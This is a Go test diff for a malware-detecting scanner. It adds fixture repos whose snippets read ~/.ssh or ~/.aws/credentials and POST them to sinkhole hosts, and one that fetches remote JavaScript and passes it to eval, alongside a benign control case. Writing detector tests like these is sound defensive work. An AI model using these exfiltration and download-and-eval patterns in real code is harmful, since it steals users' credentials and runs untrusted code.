@@ -142,6 +142,37 @@ func TestScriptHeuristics(t *testing.T) {
 			wantAt:   map[string]string{"GAL-OBF-001": "index.js:1"},
 		},
 		{
+			name:     "credential directory joined from segments and sent",
+			setup:    filesRepo(map[string]string{"c.js": "const path = require('path');\nconst os = require('os');\nconst dir = path.join(os.homedir(), '.ssh');\nrequire('https').request({ hostname: 'c.sinkhole.test', method: 'POST' }).end(fs.readdirSync(dir).join());\n"}),
+			wantCode: 20,
+			wantAt:   map[string]string{"GAL-EXFIL-001": "c.js:3"},
+		},
+		{
+			name:     "python credential file joined from segments and posted",
+			setup:    filesRepo(map[string]string{"c.py": "import os, requests\np = os.path.join(os.path.expanduser('~'), '.aws', 'credentials')\nrequests.post('https://c.sinkhole.test/c', data=open(p).read())\n"}),
+			wantCode: 20,
+			wantAt:   map[string]string{"GAL-EXFIL-001": "c.py:2"},
+		},
+		{
+			name:     "download handed to eval through a promise",
+			setup:    filesRepo(map[string]string{"loader.js": "fetch('https://c2.sinkhole.test/p.js')\n  .then((r) => r.text())\n  .then((t) => eval(t));\n"}),
+			wantCode: 10,
+			wantAt:   map[string]string{"GAL-EXEC-001": "loader.js:3"},
+		},
+		{
+			name:     "credential file read far from the request that sends it",
+			setup:    filesRepo(map[string]string{"c.py": "import requests\nstolen = open('/root/.aws/credentials').read()\n" + strings.Repeat("work()\n", 150) + "requests.post('https://c.sinkhole.test/c', data=stolen)\n"}),
+			wantCode: 10,
+			wantAt:   map[string]string{"GAL-EXFIL-001": "c.py:2"},
+		},
+		{
+			name:            "benign app joins an env example path and calls an API",
+			setup:           filesRepo(map[string]string{"server.js": "const t = fs.readFileSync(path.join(__dirname, '.env.example'), 'utf8');\nfetch('https://api.example.test').then((r) => r.json());\n"}),
+			wantCode:        0,
+			wantAbsent:      []string{"GAL-EXFIL-001", "GAL-EXFIL-002", "GAL-EXEC-001"},
+			wantScoreAtMost: 0,
+		},
+		{
 			name:            "benign minified library with Function, fromCharCode, atob and a data URI",
 			setup:           func(t *testing.T) string { return corpus(t, "benign-minified-js") },
 			wantCode:        0,
